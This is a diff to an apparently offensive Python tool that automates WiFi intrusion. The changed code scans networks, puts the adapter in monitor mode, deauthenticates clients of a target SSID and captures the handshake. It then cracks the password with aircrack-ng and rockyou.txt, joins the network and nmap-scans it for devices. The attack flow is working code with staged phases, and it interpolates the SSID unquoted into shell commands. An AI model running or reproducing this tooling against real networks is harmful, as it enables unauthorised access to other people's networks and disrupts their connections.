@@ -20,9 +20,9 @@ def scan_wifi_networks():
     """Scan available WiFi networks."""
     print_status("Scanning WiFi networks...", "scan")
     if os.name == "nt":
-        rc, out, _ = run_command("netsh wlan show networks mode=bssid", timeout=15)
+        rc, out = run_command_live("netsh wlan show networks mode=bssid", timeout=15, prefix="    ")
     else:
-        rc, out, _ = run_command("nmcli -t -f SSID,SIGNAL,SECURITY dev wifi list 2>/dev/null || iwlist wlan0 scan 2>/dev/null", timeout=15)
+        rc, out = run_command_live("nmcli -t -f SSID,SIGNAL,SECURITY dev wifi list 2>/dev/null || iwlist wlan0 scan 2>/dev/null", timeout=15, prefix="    ")
     if rc != 0:
         print_status("Could not scan WiFi. Check adapter.", "error")
         return []
@@ -64,7 +64,7 @@ def wifi_attack_flow(target_ssid):
             return False
 
     print_status("Enabling monitor mode...", "attack")
-    rc,_,_ = run_command("sudo airmon-ng start wlan0", timeout=10)
+    rc, _ = run_command_live("sudo airmon-ng start wlan0", timeout=10, prefix="    ")
     if rc != 0:
         print_status("Could not enable monitor mode.", "error")
         return False
@@ -74,23 +74,23 @@ def wifi_attack_flow(target_ssid):
     cap_file = f"/tmp/clan_nxt_{target_ssid}"
     run_command(f"timeout 30 airodump-ng --bssid $(nmcli -t -f BSSID,SSID dev wifi | grep '{target_ssid}' | cut -d: -f1-6) -w {cap_file} --output-format pcap wlan0mon &", timeout=5)
     time.sleep(3)
-    run_command(f"aireplay-ng --deauth 10 -a $(nmcli -t -f BSSID,SSID dev wifi | grep '{target_ssid}' | cut -d: -f1-6) wlan0mon", timeout=20)
+    run_command_live(f"aireplay-ng --deauth 10 -a $(nmcli -t -f BSSID,SSID dev wifi | grep '{target_ssid}' | cut -d: -f1-6) wlan0mon", timeout=20, prefix="    ")
     time.sleep(25)
 
     print_status("Bruteforcing handshake with rockyou.txt...", "attack")
     wordlist = "/usr/share/wordlists/rockyou.txt"
     if not os.path.isfile(wordlist):
         wordlist = "/usr/share/wordlists/fasttrack.txt"
-    rc, out, _ = run_command(f"aircrack-ng -w {wordlist} {cap_file}*.cap", timeout=600)
+    rc, out = run_command_live(f"aircrack-ng -w {wordlist} {cap_file}*.cap", timeout=600, prefix="    ")
     if "KEY FOUND" in out:
         key = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", out)
         pwd = key.group(1) if key else "unknown"
         print_status(f"Password found: {C.G}{C.BOLD}{pwd}{C.RST}", "success")
-        run_command(f"sudo airmon-ng stop wlan0mon", timeout=5)
-        run_command(f"nmcli dev wifi connect '{target_ssid}' password '{pwd}'", timeout=15)
+        run_command_live("sudo airmon-ng stop wlan0mon", timeout=5, prefix="    ")
+        run_command_live(f"nmcli dev wifi connect '{target_ssid}' password '{pwd}'", timeout=15, prefix="    ")
         return True
     print_status("Bruteforce failed. Try a bigger wordlist.", "error")
-    run_command("sudo airmon-ng stop wlan0mon", timeout=5)
+    run_command_live("sudo airmon-ng stop wlan0mon", timeout=5, prefix="    ")
     return False
 
 def phase1_network_access(same_network):
@@ -148,7 +148,7 @@ def phase2_discover_devices(target_desc=None):
     start = time.time()
     subnet = get_subnet()
     print_status(f"ARP scanning {C.W}{subnet}{C.RST}...", "scan")
-    rc, out, _ = run_command(f"nmap -sn {subnet}", timeout=60)
+    rc, out = run_command_live(f"nmap -sn {subnet}", timeout=60, prefix="    ")
     if rc != 0:
         print_status("Network scan failed.", "error")
         return None, []
@@ -161,8 +161,9 @@ def phase2_discover_devices(target_desc=None):
     # Enhance vendor info via MAC lookup for unknowns
     for h in hosts:
         if h["vendor"] == "Unknown" or not h["vendor"]:
+            print_status(f"Looking up MAC {C.GR}{h['mac']}{C.RST}...", "scan")
             h["vendor"] = lookup_mac_vendor(h["mac"])
-            time.sleep(0.5)  # Rate limit API
+            time.sleep(0.5)
 
     rows = [[i+1, h["ip"], h["mac"], h["vendor"]] for i,h in enumerate(hosts)]
     print_table(["#","IP Address","MAC Address","Device/Vendor"], rows, title="Devices on Network")
